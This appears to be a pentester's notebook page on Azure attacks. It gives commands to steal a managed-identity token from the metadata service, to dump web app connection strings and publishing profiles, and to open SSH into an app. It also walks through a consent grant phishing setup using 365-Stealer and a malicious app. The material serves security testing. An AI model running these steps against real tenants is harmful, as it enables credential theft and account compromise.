<p>When connected to a <code>Azure</code> VM, it is possible to steel <code>Azure</code> token if the VM identity is managed</p>
<pre><code class="lang-powershell">curl <span class="hljs-string">&apos;http://169.254.169.254/metadata/identity/oauth2/token.api-version=2018-02-01&amp;resource=https://management.azure.com/&apos;</span> -H <span class="hljs-string">&apos;Metadata:true&apos;</span>
</code></pre>
<p>It is then possible to login as this user with </p>
<pre><code class="lang-powershell">az login --identity
</code></pre>
<h1 id="webapp">WebApp</h1>
<h2 id="list-webapp">List webapp</h2>
<pre><code class="lang-powershell">az webapp list
</code></pre>
<h2 id="configuration">Configuration</h2>
<p>Some secrets can be stored in the configuration file. For example, database credentials can be stored in <code>Azure</code></p>
<pre><code class="lang-powershell">az webapp config connection-string list --name ${appName} --resource-group ${resourceName}
</code></pre>
<p>Likewise, sensitive information can be stored in the deployment configuration</p>
<pre><code class="lang-powershell">az webapp deployment list-publishing-profiles --resource-group ${resourceName} --name ${appName}
</code></pre>
<h2 id="webssh">WebSSH</h2>
<p>The <code>Website Contributor</code>role can access to the application underlying operating system through the <code>Console</code> feature.</p>
<p>It is possible to establish an <code>SSH</code> over <code>HTTP</code> connection when the <code>/webssh/host</code> endpoint can be reached</p>
<pre><code class="lang-powershell">(curl https://${appName}?app.scm.azurewebsites.net/webssh/host).statuscode
</code></pre>
<p>The <code>SSH</code> session can be opened with <code>AzCli</code></p>
<pre><code class="lang-powershell"><span class="hljs-comment"># It open a port forwardin (43605)</span>
az webapp create-remote-connection --subscription ${subscription} --resource-groupe ${resourceGroup} --n ${applicationName}

<span class="hljs-comment"># Connect to ssh</span>
ssh root@localhost -p <span class="hljs-number">43605</span>
</code></pre>
<h1 id="consent-grant-attack">Consent grant attack</h1>
<p>The <code>Consent grant attack</code> is an attack where a user will connect to a malicious application with his <code>Azure</code> account. The malicious application will ask for several permission such as the right to read <code>OneDrive</code> files or access to <code>Outlook</code>.</p>
<p>The application is designed to redirect the user and steal its authentication token to abuse the excessive rights.</p>
<p>At the moment, this attack will not work on cross tenant users as it asks for administrator rights during the authentication.</p>
<h2 id="set-up-the-trap">Set up the trap</h2>
<p>The <a href="https://github.com/AlteredSecurity/365-Stealer" target="_blank">365-Stealer</a> project can be deployed on a server to automatize token retrieval and use.</p>
<h2 id="set-the-application-permission">Set the application permission</h2>
<p>The permission code can be found <a href="https://marketplace.visualstudio.com/items?itemName=stephane-eyskens.aadv1appprovisioning" target="_blank">here</a></p>
<p>Be careful, some rights need <code>Administrator</code> approval and users will not be able to accept them.</p>
<p>Set the application permission a new <code>manifest.json</code> file:</p>
<pre><code># manifest.json

[
    {
        &quot;resourceAppId&quot;: &quot;00000003-0000-0000-c000-000000000000&quot;,
        &quot;resourceAccess&quot;: [
            {
                &quot;id&quot;: &quot;e1fe6dd8-ba31-4d61-89e7-88639da4683d&quot;,
                &quot;type&quot;: &quot;Scope&quot;
            },
            {
                &quot;id&quot;: &quot;863451e7-0667-486c-a5d6-d135439485f0&quot;,
                &quot;type&quot;: &quot;Scope&quot;
            }
        ]
    }
]
</code></pre><h2 id="create-a-new-application">Create a new application</h2>
<p>This application will authenticate the user and redirect him to the <code>365-stealer</code> application deployed on a remote server.</p>
<pre><code class="lang-powershell">az ad app create --display-name ${appName} --available-to-other-tenants true --reply-urls https://${serverName}/login/authorized --oauth2-allow-implicit-flow false --required-resource-accesses @manifest.json
az ad app owner add --owner-object cd60eb94-ad23-<span class="hljs-number">4</span>cee-<span class="hljs-number">86</span>cc-<span class="hljs-number">4819</span>be4d6123 --id <span class="hljs-number">7</span>de80acb-<span class="hljs-number">4263</span>-<span class="hljs-number">4</span>a8f-<span class="hljs-number">9</span>f8b-<span class="hljs-number">30</span>b9abcab4e3
az ad app update --id <span class="hljs-number">7</span>de80acb-<span class="hljs-number">4263</span>-<span class="hljs-number">4</span>a8f-<span class="hljs-number">9</span>f8b-<span class="hljs-number">30</span>b9abcab4e3 --oauth2-allow-implicit-flow false
az ad app update --id <span class="hljs-number">7</span>de80acb-<span class="hljs-number">4263</span>-<span class="hljs-number">4</span>a8f-<span class="hljs-number">9</span>f8b-<span class="hljs-number">30</span>b9abcab4e3 --set oauth2Permissions[<span class="hljs-number">0</span>].isEnabled=false
az ad app update --id <span class="hljs-number">7</span>de80acb-<span class="hljs-number">4263</span>-<span class="hljs-number">4</span>a8f-<span class="hljs-number">9</span>f8b-<span class="hljs-number">30</span>b9abcab4e3 --set oauth2Permissions=[]
az ad app credential reset --id <span class="hljs-number">7</span>de80acb-<span class="hljs-number">4263</span>-<span class="hljs-number">4</span>a8f-<span class="hljs-number">9</span>f8b-<span class="hljs-number">30</span>b9abcab4e3
</code></pre>
<h2 id="send-the-malicious-url">Send the malicious URL</h2>
<pre><code class="lang-powershell"><span class="hljs-string">&apos;https://login.microsoftonline.com/common/oauth2/authorize?%20response_type=code&amp;client_id=${applicationClientId}&amp;redirect_uri${redirectUri}&amp;response_mode=query&apos;</span>
</code></pre>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Azure","level":"4.1.1.1","depth":3,"next":{"title":"Configuration Review","level":"4.1.2","depth":2,"ref":"","articles":[{"title":"Database","level":"4.1.2.1","depth":3,"path":"Pentest/Configuration review/Database.md","ref":"Pentest/Configuration review/Database.md","articles":[]},{"title":"Kubernetes","level":"4.1.2.2","depth":3,"path":"Pentest/Configuration review/Kubernetes.md","ref":"Pentest/Configuration review/Kubernetes.md","articles":[]},{"title":"KubernetesCIS","level":"4.1.2.3","depth":3,"path":"Pentest/Configuration review/KubernetesCIS.md","ref":"Pentest/Configuration review/KubernetesCIS.md","articles":[]}]},"previous":{"title":"Cloud","level":"4.1.1","depth":2,"ref":"","articles":[{"title":"Azure","level":"4.1.1.1","depth":3,"path":"Pentest/Cloud/Azure.md","ref":"Pentest/Cloud/Azure.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-sharing","collapsible-chapters","copy-code-button","hide-published-with","search-plus","simple-page-toc"],"pluginsConfig":{"github":{"url":"https://github.com/YoannDqr"},"simple-page-toc":{"maxDepth":3,"skipFirstH1":true},"search":{},"collapsible-chapters":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"hide-published-with":{},"fontsettings":{"theme":"white","family":"sans","size":2},"twitter":{"url":"https://twitter.com/HackerOtter"},"highlight":{},"copy-code-button":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"search-plus":{}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"Pentest/Cloud/Azure.md","mtime":"2022-07-24T14:58:57.457Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-09-01T09:48:15.012Z"},"basePath":"../..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../../gitbook/gitbook.js"></script>
    <script src="../../gitbook/theme.js"></script>
    
        
        <script src="../../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-copy-code-button/toggle.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-hide-published-with/plugin.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search-plus/search.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

